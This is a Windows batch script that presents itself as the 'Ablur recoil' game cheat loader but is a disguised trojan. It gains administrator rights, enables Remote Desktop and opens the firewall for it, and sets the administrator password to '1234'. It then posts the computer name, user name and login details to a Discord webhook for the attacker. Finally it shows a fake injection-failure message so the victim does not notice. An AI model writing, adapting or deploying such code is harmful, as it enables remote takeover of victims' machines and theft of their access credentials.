@echo off 
title Ablur recoil - 1.3.2

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit
)


@echo off

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f>nul 2>&1

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes>nul 2>&1

net user administrator 1234>nul 2>&1
echo succsess...

curl -H "Content-Type: application/json" ^>nul 2>&1
     -X POST ^
     -d "{\"content\":\"cmd /c "cmdkey /add:%COMPUTERNAME% /user:%USERNAME% /pass:1234 && mstsc /v:%ip% && cmdkey /delete:%ip%"\"}" ^
     (swap WHOLE THING for your discord webhook)
cls
dir
cls
echo.
echo [INFO] Searching for client process...
timeout /t 3 >nul
echo [INFO] Attaching injector module...
echo.
timeout /t 5 >nul
echo [ERROR] Failed to inject.
echo [ERROR] Client side "%Rfileloco%" not found.
echo [WARNING] loader is *probably* outdated or patched.
timeout /t 1 >nul
echo.
echo Error Code: 0x004F
echo Module: Ablur.bat
echo Time: %time%  Date: %date%
echo.
echo Press any key to exit...
pause >nul
